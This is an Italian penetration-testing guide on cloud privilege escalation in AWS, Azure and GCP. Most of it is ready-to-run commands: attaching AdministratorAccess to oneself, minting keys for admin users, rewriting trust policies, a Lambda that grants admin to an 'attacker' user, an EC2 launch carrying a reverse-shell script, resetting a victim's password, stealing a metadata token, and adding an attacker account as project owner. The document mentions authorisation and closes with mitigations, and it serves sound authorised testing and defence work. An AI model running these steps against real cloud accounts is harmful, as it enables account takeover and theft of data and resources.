# Cloud Privilege Escalation

## Scopo

Questa guida copre tecniche di privilege escalation in ambienti cloud (AWS, Azure, GCP) per ottenere accesso a risorse più privilegiate durante penetration test.

## Prerequisiti

- Accesso iniziale all'ambiente cloud
- CLI cloud configurate
- Conoscenza IAM policies
- **Autorizzazione per testing**

---

## AWS Privilege Escalation

### IAM Policy Analysis

```bash
# Chi sono
aws sts get-caller-identity

# Policies attached
aws iam list-attached-user-policies --user-name USER
aws iam list-user-policies --user-name USER
aws iam get-user-policy --user-name USER --policy-name POLICY

# Roles assumibili
aws iam list-roles
```

### Dangerous Permissions

| Permission | Rischio |
|------------|---------|
| iam:CreatePolicy | Creare policy arbitrarie |
| iam:AttachUserPolicy | Attach policy a sé stesso |
| iam:CreateAccessKey | Nuove credenziali per altri |
| iam:UpdateAssumeRolePolicy | Modificare trust policy |
| sts:AssumeRole | Assumere ruoli privilegiati |
| lambda:CreateFunction | RCE con ruolo Lambda |
| ec2:RunInstances | Nuova EC2 con ruolo |

### Tecniche Comuni

```bash
# 1. Attach AdministratorAccess
aws iam attach-user-policy --user-name ME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. Crea access key per admin
aws iam create-access-key --user-name admin

# 3. Modifica trust policy di ruolo admin
aws iam update-assume-role-policy --role-name AdminRole --policy-document file://trust.json

# 4. Assume role privilegiato
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/AdminRole --role-session-name privesc
```

### Lambda Privilege Escalation

```bash
# Se hai lambda:CreateFunction + iam:PassRole
# Crea Lambda con ruolo admin

aws lambda create-function \
    --function-name privesc \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT:role/AdminRole \
    --handler lambda_function.handler \
    --zip-file fileb://code.zip

# Lambda code (code.zip)
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user-policy(
        UserName='attacker',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
```

### EC2 Instance Profile

```bash
# Se hai ec2:RunInstances + iam:PassRole
# Lancia EC2 con ruolo privilegiato

aws ec2 run-instances \
    --image-id ami-xxx \
    --instance-type t2.micro \
    --iam-instance-profile Name=AdminRole \
    --user-data file://reverse_shell.sh
```

---

## Azure Privilege Escalation

### Role Analysis

```bash
# Chi sono
az account show
az ad signed-in-user show

# Roles
az role assignment list --assignee USER_ID
az role definition list

# Group memberships
az ad user get-member-groups --id USER_ID
```

### Dangerous Roles

| Role | Rischio |
|------|---------|
| Owner | Full control |
| User Access Administrator | Assegnare ruoli |
| Contributor | Modificare risorse |
| Virtual Machine Contributor | Accesso VM |

### Tecniche Comuni

```bash
# 1. Self-assign Owner role (se hai User Access Admin)
az role assignment create --assignee ME --role Owner

# 2. Reset password di altro utente
az ad user update --id VICTIM_ID --password NewP@ss123

# 3. Add to privileged group
az ad group member add --group "Global Administrators" --member-id USER_ID
```

### Managed Identity Abuse

```bash
# Da VM con Managed Identity
# Ottieni token

curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Usa token per chiamare Azure APIs
az login --identity
az account list
```

### Automation Account

```bash
# Se hai accesso ad Automation Account con RunAs Account
# RunAs ha spesso Owner sul subscription

# Crea runbook malevolo
# Esegui per privilege escalation
```

---

## GCP Privilege Escalation

### IAM Analysis

```bash
# Chi sono
gcloud auth list
gcloud config get-value project

# IAM policy
gcloud projects get-iam-policy PROJECT_ID

# Service accounts
gcloud iam service-accounts list
```

### Dangerous Permissions

| Permission | Rischio |
|------------|---------|
| iam.serviceAccounts.actAs | Impersonare SA |
| iam.serviceAccountKeys.create | Creare chiavi SA |
| resourcemanager.projects.setIamPolicy | Modificare IAM |
| compute.instances.create | Creare VM con SA |

### Tecniche Comuni

```bash
# 1. Crea chiave per service account privilegiato
gcloud iam service-accounts keys create key.json \
    --iam-account=admin-sa@PROJECT.iam.gserviceaccount.com

# 2. Impersona service account
gcloud auth activate-service-account --key-file=key.json

# 3. Aggiungi IAM binding
gcloud projects add-iam-policy-binding PROJECT \
    --member="user:attacker@gmail.com" \
    --role="roles/owner"
```

### Compute Instance SA

```bash
# Se hai compute.instances.create + iam.serviceAccounts.actAs
gcloud compute instances create privesc-vm \
    --service-account=admin-sa@PROJECT.iam.gserviceaccount.com \
    --scopes=cloud-platform \
    --zone=us-central1-a
```

### Cloud Functions

```bash
# Simile a Lambda
# Crea function con SA privilegiato
gcloud functions deploy privesc \
    --runtime python39 \
    --trigger-http \
    --service-account=admin-sa@PROJECT.iam.gserviceaccount.com \
    --source=./code
```

---

## Tools

### Pacu (AWS)

```bash
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu
python3 pacu.py

# Moduli
Pacu > run iam__enum_permissions
Pacu > run iam__privesc_scan
Pacu > run iam__bruteforce_permissions
```

### ScoutSuite

```bash
pip install scoutsuite

# AWS
scout aws

# Azure
scout azure --cli

# GCP
scout gcp --service-account key.json
```

### Prowler (AWS)

```bash
pip install prowler
prowler
prowler -c check11  # Privilege escalation checks
```

### AzureHound/ROADtools

```bash
# BloodHound per Azure
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui
```

---

## Mitigazioni

### AWS

```
- Least privilege
- Service Control Policies (SCPs)
- Permission boundaries
- Access Analyzer
```

### Azure

```
- PIM (Privileged Identity Management)
- Conditional Access
- Azure AD roles review
```

### GCP

```
- Organization policies
- VPC Service Controls
- IAM Recommender
```

---

## Best Practices

- **Document**: Log ogni passaggio di escalation
- **Minimal**: Usa solo permessi necessari
- **Reversible**: Preferisci azioni reversibili
- **Scope**: Rispetta limiti autorizzati
- **Report**: Documenta path di escalation

## Riferimenti

- [AWS IAM Vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu](https://github.com/RhinoSecurityLabs/pacu)
- [Azure Attack Paths](https://github.com/Azure/Azure-Security-Center)
- [GCP IAM Escalation](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
